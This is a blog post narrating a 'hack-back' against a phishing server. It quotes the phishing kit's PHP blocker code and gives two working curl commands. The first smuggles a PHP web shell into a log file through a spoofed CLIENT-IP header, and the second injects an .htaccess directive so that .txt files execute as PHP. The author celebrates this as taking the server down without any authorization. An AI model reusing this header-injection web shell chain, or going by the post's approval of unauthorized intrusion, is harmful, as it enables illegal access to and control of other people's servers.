---
layout: post
title: "Hack-back: the tale of embarrassing phishing campaign"
date: 2020-01-14 00:00:00 -0000
categories: ['Ethical hacking', 'Privacy']
tags: [hack-back, phishing, PHP]
author: vavkamil
redirect_from:
  - /2020/01/14/hack-back-the-tale-of-embarrassing-phishing-campaign/
---

<hr>

<!-- wp:paragraph -->
<p>UPDATE: 17th January 2020: Another <a rel="noreferrer noopener" aria-label="landing page disabled (opens in a new tab)" href="https://www.reddit.com/r/ProtonMail/comments/eor72x/just_took_down_a_phishing_server_aimed_at/felm2ud" target="_blank">landing page disabled</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:separator {"className":"is-style-wide"} -->
<hr class="wp-block-separator is-style-wide"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>UPDATE: 15th January 2020: I posted this to reddit.com/r/hacking and it seems like the mods didn't like it, they consider my blog post as a self-promotion and spam. Thank you!<br><em>You have been permanently banned from participating in r/hacking<br>You have been permanently banned from participating in r/ActLikeYouBelong<br>You have been permanently banned from participating in r/AskNetsec</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator {"className":"is-style-wide"} -->
<hr class="wp-block-separator is-style-wide"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Today was a good day, I received a phishing email to by <a rel="noreferrer noopener" aria-label="Protonmail (opens in a new tab)" href="https://protonmail.com" target="_blank">Protonmail</a> address. I don't have a copy of the email, as I reported it and later deleted it as spam. Thankfully, other security research took screenshots yesterday:</p>
<!-- /wp:paragraph -->

<!-- wp:core-embed/twitter {"url":"https://twitter.com/d4rkm0de/status/1216740446178889729","type":"rich","providerNameSlug":"twitter"} -->
<figure class="wp-block-embed-twitter wp-block-embed is-type-rich is-provider-twitter"><div class="wp-block-embed__wrapper">
https://twitter.com/d4rkm0de/status/1216740446178889729
</div><figcaption>Credits to @d4rkm0de</figcaption></figure>
<!-- /wp:core-embed/twitter -->

<!-- wp:core-embed/twitter {"url":"https://twitter.com/vavkamil/status/1217173739676274689","type":"rich","providerNameSlug":"twitter"} -->
<figure class="wp-block-embed-twitter wp-block-embed is-type-rich is-provider-twitter"><div class="wp-block-embed__wrapper">
https://twitter.com/vavkamil/status/1217173739676274689
</div><figcaption>Figured I can do a write-up after the tweet</figcaption></figure>
<!-- /wp:core-embed/twitter -->

<!-- wp:paragraph -->
<p>The phishing mail was included a Bitly link (URL shortener). The nice thing about Bitly is that you can add a plus (+) character on the end of URL and it will show you how many people clicked the link and what is the location of redirect:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":715,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="{{ '/assets/img/2020/01/image.png' | relative_url }}" alt="" class="wp-image-715"/><figcaption>https://bitly.com/2R1paP9+</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>More than 100 people clicked the link when I received the phishing email. I was a little bit bored, so I started poking around a little bit. I quickly found a directory listing with full source code:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":716,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="{{ '/assets/img/2020/01/image-1.png' | relative_url }}" alt="" class="wp-image-716"/><figcaption>Prevent this by adding "Options -Indexes" to .htaccess</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The landing page was written in PHP, it was kinda a generic one, nothing unordinary, except a <code>blocker.php</code>file. It was a code to block security researchers and malware hunters based on IP ranges and user-agent strings. If any of the above matched, the IP was denied access in <code>.htaccess</code> and added to a file <code>badbot.txt</code> for a further investigation.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The fourth line got my attention, as it was very unique:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>$ipa = $_SERVER&#91;'HTTP_CLIENT_IP']? $_SERVER&#91;'HTTP_CLIENT_IP'] : ($_SERVER&#91;'HTTP_X_FORWARDE‌​D_FOR'] ? $_SERVER&#91;'HTTP_X_FORWARDED_FOR'] : $_SERVER&#91;'REMOTE_ADDR'] );
$useragent = $_SERVER&#91;'HTTP_USER_AGENT'];

if(isset($_POST&#91;'gotcha'])){
     blockBot($ipa);
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>The thing in web security is, you should never trust user input. In this case, you can spoof both <code>HTTP_CLIENT_IP</code> and <code>HTTP_X_FORWARDED_FOR</code> headers.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If you called the <code>blocker.php</code> script with a POST request and <code>gotcha</code> parameter, the IP address was blocked:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>function blockBot($ip){
$bot = 'deny from '.$ip;
$myfile = file_put_contents('.htaccess', PHP_EOL.$bot.PHP_EOL , FILE_APPEND | LOCK_EX);
header('HTTP/1.0 404 Not Found');
die("&lt;h1>404 Not Found&lt;/h1>The page that you have requested could not be found.");
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>If the user-agent matched any array value like <code>InfoSec, Kaspersky, ...</code>, the IP was added to <code>badbot.txt</code>:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>foreach($bad as $zbal) {
    if(stripos($useragent,$zbal) !== false) {
        file_put_contents('badbot.txt', $ipa, FILE_APPEND | LOCK_EX);
        blockBot($ipa);
    }
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>So I quickly figured out that I can insert PHP shell to <code>badbot.txt</code> and force .htaccess to execute .txt files as PHP. The trick from the 2000s used to hack insecure PHP uploads :)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Inserting PHP web shell into <code>badbot.txt</code> (learned this one from <a rel="noreferrer noopener" aria-label="Sucuri (opens in a new tab)" href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html" target="_blank">Sucuri</a>):</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>curl $url/blocker.php -H "CLIENT-IP: &lt;?php extract($_REQUEST);$a($b); ?> " -H "User-agent: InfoSec"</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Forcing Apache to execute .txt as PHP via .htaccess:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>curl $url/blocker.php -H "CLIENT-IP: \r\nAddType application/x-httpd-php .txt\r\n" -H "User-agent: google" --data "gotcha=1"</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>This can be a very nice CTF challenge, full source-code here: <a rel="noreferrer noopener" aria-label="https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b (opens in a new tab)" href="https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b" target="_blank">https://gist.github.com/vavkamil/b115ef829329f9fd3876c077e843641b</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the end, I was able to take down the phishing infrastructure in less than 30 minutes, and maybe saved someone from a compromise. Mess with the best, die like the rest!</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Indicators of compromise (IoC):</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>urielsilveira[dot]com</li><li>keyword.tech.2017[at]gmail.com</li><li>alvinwalker247[at]gmail.com</li></ul>
<!-- /wp:list -->

<!-- wp:image {"id":719,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="{{ '/assets/img/2020/01/error_500.png' | relative_url }}" alt="" class="wp-image-719"/><figcaption>Phishing out of service</figcaption></figure>
<!-- /wp:image -->